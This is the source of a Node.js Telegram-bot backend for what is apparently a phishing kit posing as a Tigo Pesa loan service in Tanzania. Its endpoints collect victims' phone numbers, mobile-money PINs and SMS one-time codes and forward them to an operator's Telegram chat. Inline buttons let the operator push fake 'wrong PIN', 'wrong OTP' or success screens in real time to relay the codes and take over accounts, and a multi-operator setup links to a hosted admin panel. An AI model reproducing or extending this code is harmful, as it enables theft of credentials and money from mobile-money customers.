/**
 * **MIXX BY YAS - BACKEND SERVER (MULTI-ADMIN SUPPORT & SAFE WEBHOOK/POLLING)**
 * 
 * Includes:
 * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
 * - Clean Admin Panel link without trailing query parameters on the base URL.
 */

const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DEFAULT_CHAT_ID = process.env.TELEGRAM_CHAT_ID || null;
const APP_URL = process.env.APP_URL || null;
const USE_WEBHOOK = String(process.env.USE_WEBHOOK || 'false').toLowerCase() === 'true';

if (!TOKEN) {
  console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
  process.exit(1);
}

const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TOKEN}`;
let bot = null; 
const sessions = new Map();

/**
 * **TIGO PESA TANZANIA NUMBER VALIDATOR**
 * Valid Tigo prefixes: 065, 067, 071, 077.
 */
function isValidTigoNumber(phoneStr) {
  if (!phoneStr) return false;
  const cleaned = String(phoneStr).trim().replace(/[\s\-\(\)]/g, '');
  const tigoRegex = /^(?:\+?255|0)?(65|67|71|77)\d{7}$/;
  return tigoRegex.test(cleaned);
}

async function telegramApi(pathSuffix, options = {}) {
  const url = `${TELEGRAM_API_BASE}/${pathSuffix}`;
  const res = await fetch(url, options);
  return res.json();
}

async function initBot() {
  if (USE_WEBHOOK) {
    if (!APP_URL) {
      console.error('USE_WEBHOOK is true but APP_URL is not set; cannot enable webhook mode.');
      process.exit(1);
    }
    console.log('[Bot] Starting in WEBHOOK mode.');
    bot = new TelegramBot(TOKEN, { polling: false });

    const webhookPath = `/bot${TOKEN}`;
    const webhookUrl = `${APP_URL}${webhookPath}`;
    try {
      console.log(`[Bot] Setting webhook to ${webhookUrl}`);
      await bot.setWebHook(webhookUrl);
      console.log('[Bot] Webhook set successfully.');
      app.post(webhookPath, (req, res) => {
        res.sendStatus(200);
        try {
          bot.processUpdate(req.body);
        } catch (err) {
          console.error('[Bot] Error processing update from webhook:', err);
        }
      });
    } catch (err) {
      console.error('[Bot] Failed to set webhook:', err?.response?.body || err.message || err);
      process.exit(1);
    }
  } else {
    console.log('[Bot] Starting in POLLING mode (will ensure webhook is removed first).');
    try {
      const info = await telegramApi('getWebhookInfo');
      if (info && info.ok && info.result && info.result.url) {
        console.log('[Bot] Detected existing webhook:', info.result.url);
        console.log('[Bot] Deleting existing webhook to allow polling...');
        const del = await telegramApi('deleteWebhook');
        if (del && del.ok) {
          console.log('[Bot] Webhook deleted.');
        } else {
          console.warn('[Bot] deleteWebhook response:', del);
        }
      } else {
        console.log('[Bot] No webhook configured; safe to start polling.');
      }
    } catch (err) {
      console.warn('[Bot] Could not query webhook info (continuing):', err?.message || err);
    }

    bot = new TelegramBot(TOKEN, { polling: true });
    console.log('[Bot] Polling started.');
  }

  bot.on('polling_error', (err) => {
    console.error('[Bot] polling_error:', err?.message || err);
  });

  bot.on('webhook_error', (err) => {
    console.error('[Bot] webhook_error:', err?.message || err);
  });

  /**
   * **INSTANT /START COMMAND HANDLER**
   * Displays the clean base link without trailing parameters in the main text block,
   * keeping the user's specific chat ID isolated under personal information.
   */
  bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const user = msg.from;

    const firstName = user.first_name || 'Not Provided';
    const lastName = user.last_name || '';
    const fullName = `${firstName} ${lastName}`.trim();
    const username = user.username ? `@${user.username}` : 'No username set';
    
    // Clean base admin panel link
    const cleanAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/Admin-1`;

    const userWelcomeInfo = 
      `🚨 **New User Started the Bot!**\n\n` +
      `👤 **Name:** ${fullName}\n` +
      `🆔 **Chat ID:** \`${user.id}\`\n` +
      `🏷 **Username:** ${username}\n` +
      `🔗 **Admin Panel Link:** [${cleanAdminLink}](${cleanAdminLink})`;

    await bot.sendMessage(chatId, userWelcomeInfo, { 
      parse_mode: 'Markdown',
      disable_web_page_preview: true 
    }).catch(err => console.error('[Bot] Failed to send info to user:', err.message));
  });

  // Attach callback_query handler
  bot.on('callback_query', async (query) => {
    try {
      const actionData = query.data || '';
      const parts = actionData.split('_');
      const prefix = parts.slice(0, 2).join('_'); 
      const userId = parts.slice(2).join('_');

      const session = sessions.get(userId);
      if (!session) {
        await bot.answerCallbackQuery(query.id, { text: '⚠️ Session expired or not found.' });
        return;
      }

      const chatTarget = session.adminChatId || DEFAULT_CHAT_ID;
      switch (prefix) {
        case 'ALLOW_OTP':
          session.status = 'APPROVED_LOAD_OTP';
          await bot.sendMessage(chatTarget, `✅ OTP Screen loaded for +255 ${session.phone}`);
          break;
        case 'DENY_OTP':
          session.status = 'DENIED';
          await bot.sendMessage(chatTarget, `❌ Access Denied for +255 ${session.phone}`);
          break;
        case 'CORRECT_OTP':
          session.status = 'SUCCESS';
          await bot.sendMessage(chatTarget, `🎉 Success screen triggered for +255 ${session.phone}`);
          break;
        case 'WRONG_PIN':
          session.status = 'WRONG_PIN_ERROR';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong PIN error for +255 ${session.phone}`);
          break;
        case 'WRONG_OTP':
          session.status = 'WRONG_OTP_ERROR';
          await bot.sendMessage(chatTarget, `⚠️ Triggered Wrong OTP error for +255 ${session.phone}`);
          break;
        default:
          break;
      }

      await bot.answerCallbackQuery(query.id, { text: `Processed: ${prefix}` });

      if (query.message && query.message.message_id) {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        ).catch(err => console.log('Could not clear markup:', err.message));
      }

    } catch (err) {
      console.error('[Bot] callback_query handler error:', err);
    }
  });
}

function getTargetChatId(reqChatId) {
  return reqChatId || DEFAULT_CHAT_ID;
}

/**
 * **SUBMIT APPLICATION (PIN ENTRY)**
 * Requires valid Tigo Pesa Tanzania number.
 */
app.post('/api/submit-application', (req, res) => {
  try {
    const { phone, pin, amount, adminChatId } = req.body || {};

    if (!isValidTigoNumber(phone)) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid phone number. Only registered Tigo Pesa Tanzania numbers (starting with 065, 067, 071, or 077) are allowed.' 
      });
    }

    const targetChat = getTargetChatId(adminChatId);
    const userId = phone || `user_${Date.now()}`;

    sessions.set(userId, {
      phone,
      pin,
      amount: amount || 'TZS 1,000,000',
      adminChatId: targetChat,
      status: 'WAITING_PIN_APPROVAL',
      createdAt: new Date()
    });

    if (!targetChat) {
      return res.status(400).json({ success: false, error: 'No admin chat ID configured or provided' });
    }

    const message =
      `🚨 *NEW LOAN LOGIN / PIN ATTEMPT*\n\n` +
      `📱 *Tigo Phone:* +255 ${phone}\n` +
      `🔑 *PIN Entered:* \`${pin}\`\n` +
      `💰 *Selected Amount:* ${amount}\n\n` +
      `📌 *Status:* Waiting for Admin Approval`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
            { text: '❌ DENY OTP', callback_data: `DENY_OTP_${userId}` }
          ]
        ]
      }
    };

    bot.sendMessage(targetChat, message, opts)
      .then(sentMsg => {
        const session = sessions.get(userId);
        if (session) session.adminMsgId = sentMsg.message_id;
        res.status(200).json({ success: true, userId });
      })
      .catch(err => {
        console.error('Telegram API Error:', err.message);
        res.status(500).json({ success: false, error: 'Telegram notification failed' });
      });

  } catch (error) {
    console.error('Server Error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

/**
 * **CHECK SESSION STATUS ENDPOINT**
 */
app.get('/api/check-status/:userId', (req, res) => {
  const { userId } = req.params;
  const session = sessions.get(userId);
  if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
  res.status(200).json({ status: session.status });
});

/**
 * **RECEIVE SMS OTP & PROMPT ADMIN**
 */
app.post('/api/submit-otp', (req, res) => {
  try {
    const { userId, otp } = req.body || {};
    const session = sessions.get(userId);

    if (!session) return res.status(404).json({ success: false, error: 'Session not found' });

    session.status = 'WAITING_OTP_VERIFICATION';
    session.otp = otp;

    const message =
      `📩 *SMS OTP SUBMITTED BY USER*\n\n` +
      `📱 *Tigo User:* +255 ${session.phone}\n` +
      `🔢 *OTP Entered:* \`${otp}\`\n\n` +
      `Choose verification response:`;

    const opts = {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
          ],
          [
            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
          ]
        ]
      }
    };

    const targetChat = session.adminChatId || DEFAULT_CHAT_ID;
    bot.sendMessage(targetChat, message, opts).catch(() => {});

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Start initialization & HTTP server
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  console.log(`[Server] Mixx by Yas server running smoothly on port ${PORT}`);
  await initBot();
});
        
